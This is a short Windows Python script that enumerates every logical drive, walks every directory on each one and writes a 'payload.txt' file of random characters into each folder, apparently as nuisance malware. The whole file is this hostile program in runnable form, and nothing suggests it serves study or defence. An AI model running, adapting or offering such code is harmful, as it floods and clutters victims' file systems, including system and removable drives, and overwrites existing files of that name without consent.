import random
import os
import platform
import win32api
import string

if platform.system() == "Windows":
    release = platform.release()
    if release != "":
        print(f"Windows {release} detected.")
    else:
        print("Windows detected, but release can't be determined.")

elif platform.system() == "Linux":
    release = platform.release()
    print(f"Linux {release} not supported.")
    quit()

elif platform.system() == "Darwin":
    release = platform.release()
    print(f"macOS {release} not supported.")
    quit()

valid_chars = string.printable
root = os.path.dirname(os.path.realpath(__file__))
get_drives = win32api.GetLogicalDriveStrings()
list_of_drives = get_drives.split("\x00")
drive_list = []

for drive in list_of_drives:
    if drive == "":
        pass
    else:
        drive_list.append(drive)

for drive in drive_list:
    payload = "".join(random.choices(valid_chars, k = random.randint(1, 1024)))
    payload_amount = random.randint(1, 5)
    if os.path.isdir(drive):
        for root, dirs, files in os.walk(drive):
            file_path = os.path.join(root, f"payload.txt")
            try:
                with open(file_path, "w", encoding="UTF-8") as file:
                    file.write(payload)
                print(f"Success! {file_path} created")
            except:
                pass
    else:
        pass
